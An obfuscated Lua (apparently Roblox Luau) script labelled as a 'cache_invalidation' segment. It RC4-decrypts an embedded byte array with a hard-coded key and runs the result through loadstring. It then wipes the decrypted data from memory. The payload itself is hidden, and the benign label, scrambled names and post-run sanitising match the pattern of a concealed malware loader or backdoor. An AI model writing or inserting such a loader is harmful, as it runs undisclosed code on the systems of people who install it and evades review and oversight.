-- Protected Segment (cache_invalidation)
local IwRJnUBq = 146
local EMEIUBMi = {
{105,50,155,68,72,136,17,100,40,69,203,194,162,135,141,208,33,52,201,116,81,251,232,142,0,121,182,151,132,147,90,17,11,136,160,208,48,31,198,45,228,105,103,153,194,118,197,130,173,163,248,49,87,153,213,152,38,237,254,29},{129,38,162,126,71,37,213,23,55,121,191,233,2,110,108,238,158,51,198,187,30,232,154,221,23,75,111,43,10,200,156,71,47,123,63,212,240,249,250,244,90,92,107,238,227,247,27,215,112,63,44,15,51,133,95,7,62,147,14,126},{203,8,140,204,15,92,247,113,188,242,36,18,100,114,193,124,237,77,106,10,106,190,1,224,223,232,92,240,121,152}
}
local uJufbNJD = "aUDKdapNMmYNIbFF"

local function DvyaIBVv(zxoAkFIg_data, zxoAkFIg_key)
    local zxoAkFIg = {}
    for tIVsOxYL = 0, 255 do zxoAkFIg[tIVsOxYL] = tIVsOxYL end
    local swLuGvxz = 0
    for tIVsOxYL = 0, 255 do
        local XFvYGIbe = zxoAkFIg_key:byte((tIVsOxYL % #zxoAkFIg_key) + 1)
        swLuGvxz = (swLuGvxz + zxoAkFIg[tIVsOxYL] + XFvYGIbe) % 256
        zxoAkFIg[tIVsOxYL], zxoAkFIg[swLuGvxz] = zxoAkFIg[swLuGvxz], zxoAkFIg[tIVsOxYL]
    end
    local tIVsOxYL = 0
    local swLuGvxz = 0
    local DQKGbRvc = {}
    for _, wnbEDGXl in ipairs(zxoAkFIg_data) do
        tIVsOxYL = (tIVsOxYL + 1) % 256
        swLuGvxz = (swLuGvxz + zxoAkFIg[tIVsOxYL]) % 256
        zxoAkFIg[tIVsOxYL], zxoAkFIg[swLuGvxz] = zxoAkFIg[swLuGvxz], zxoAkFIg[tIVsOxYL]
        local XFvYGIbe = zxoAkFIg[(zxoAkFIg[tIVsOxYL] + zxoAkFIg[swLuGvxz]) % 256]
        local unmasked = bit32.bxor(wnbEDGXl, IwRJnUBq)
        table.insert(DQKGbRvc, string.char(bit32.bxor(unmasked, XFvYGIbe)))
    end
    return table.concat(DQKGbRvc)
end

local zxoAkFIg_flat = {}
for _, chunk in ipairs(EMEIUBMi) do
    for _, byte in ipairs(chunk) do
        table.insert(zxoAkFIg_flat, byte)
    end
end

local decrypted = DvyaIBVv(zxoAkFIg_flat, uJufbNJD)
local WYkVyuaN, JXskDgqL = loadstring(decrypted)

-- Immediate Memory Sanitation: Overwrite decrypted variables
table.clear(zxoAkFIg_flat)
zxoAkFIg_flat = nil

if WYkVyuaN then 
    local result = WYkVyuaN() 
    decrypted = nil
    WYkVyuaN = nil
    return result
else 
    decrypted = nil
    warn("[ecco] Boot Error (" .. "cache_invalidation" .. "): " .. tostring(JXskDgqL)) 
end
